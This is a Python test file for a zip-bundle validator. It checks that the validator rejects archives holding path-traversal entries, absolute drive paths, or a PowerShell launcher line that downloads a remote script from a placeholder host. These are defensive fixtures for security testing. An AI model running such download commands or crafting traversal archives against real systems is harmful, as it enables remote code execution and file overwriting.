from __future__ import annotations

import zipfile
from pathlib import Path

from patchops.copilot_downloader.bundle_validator import validate_patchops_bundle_zip


def test_valid_bundle_zip_passes_without_extracting(tmp_path: Path):
    bundle = tmp_path / "bundle.zip"
    with zipfile.ZipFile(bundle, "w") as archive:
        archive.writestr("bundle/manifest.json", "{}")
        archive.writestr("bundle/content/file.txt", "hello")
    result = validate_patchops_bundle_zip(bundle)
    assert result.result_label == "PASS_BUNDLE_VALIDATED_RUN_BLOCKED"
    assert result.ok is True
    assert result.checks["zip_can_open"] is True
    assert result.checks["zip_index_only_no_extract"] is True
    assert not (tmp_path / "bundle").exists()


def test_zip_path_traversal_is_blocked(tmp_path: Path):
    bundle = tmp_path / "bad.zip"
    with zipfile.ZipFile(bundle, "w") as archive:
        archive.writestr("../evil.txt", "no")
        archive.writestr("manifest.json", "{}")
    result = validate_patchops_bundle_zip(bundle)
    assert result.result_label == "BLOCKED_INVALID_ARTIFACT"
    assert any("path_traversal" in issue for issue in result.issues)


def test_zip_absolute_or_drive_path_is_blocked(tmp_path: Path):
    bundle = tmp_path / "bad_abs.zip"
    with zipfile.ZipFile(bundle, "w") as archive:
        archive.writestr("C:/evil.txt", "no")
        archive.writestr("manifest.json", "{}")
    result = validate_patchops_bundle_zip(bundle)
    assert result.result_label == "BLOCKED_INVALID_ARTIFACT"
    assert any("absolute" in issue for issue in result.issues)


def test_unknown_zip_without_manifest_or_bundle_metadata_is_blocked_by_shape_validator(tmp_path: Path):
    bundle = tmp_path / "unknown.zip"
    with zipfile.ZipFile(bundle, "w") as archive:
        archive.writestr("readme.txt", "hello")
    result = validate_patchops_bundle_zip(bundle)
    assert result.result_label == "BLOCKED_INVALID_ARTIFACT"
    assert "missing_manifest_or_bundle_metadata" in result.issues


def test_dangerous_launcher_content_is_blocked(tmp_path: Path):
    bundle = tmp_path / "bad_launcher.zip"
    with zipfile.ZipFile(bundle, "w") as archive:
        archive.writestr("bundle/manifest.json", "{}")
        archive.writestr("bundle/run.ps1", "Invoke-WebRequest https://example.invalid/a.ps1")
    result = validate_patchops_bundle_zip(bundle)
    assert result.result_label == "BLOCKED_INVALID_ARTIFACT"
    assert any(issue.startswith("dangerous_launcher_pattern:hidden_download") for issue in result.issues)